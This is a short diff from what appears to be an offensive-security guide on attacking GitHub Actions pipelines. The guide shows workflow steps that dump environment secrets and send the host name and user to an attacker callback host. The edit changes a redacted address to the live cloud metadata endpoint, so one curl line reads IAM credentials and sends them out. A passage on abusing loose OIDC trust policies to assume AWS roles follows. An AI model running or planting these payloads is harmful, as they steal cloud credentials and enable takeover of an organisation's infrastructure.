@@ -122,7 +122,7 @@ cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected
 - run: |
     whoami; hostname; id
     curl --max-time 30 --connect-timeout 10 -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
-    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 --connect-timeout 2 http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ | base64 -w0)"
+    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
 ```
 
 **OIDC trust-policy abuse** — workflows that `configure-aws-credentials` via OIDC assume an IAM role. A trust policy whose `token.actions.githubusercontent.com:sub` condition is missing or uses a loose wildcard (`repo:ORG/*:*`) lets **any** workflow in the org (including a malicious one you can merge, or a fork on a misconfigured trigger) assume that role. Inspect the role:
